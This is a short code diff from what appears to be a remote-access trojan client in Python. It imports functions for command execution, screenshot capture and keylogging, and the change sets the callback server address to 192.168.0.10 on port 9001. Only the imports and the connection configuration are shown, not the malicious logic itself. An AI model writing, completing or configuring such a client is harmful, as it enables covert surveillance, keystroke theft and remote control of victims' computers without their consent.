@@ -1,7 +1,7 @@
 import socket
 from features import execute_command, capture_screenshot, keylogger_start
 
-SERVER_HOST = "192.168.x.x"  # Replace with your server IP
+SERVER_HOST = "192.168.0.10"  # Replace with your server IP
 SERVER_PORT = 9001
 
 def start_client():
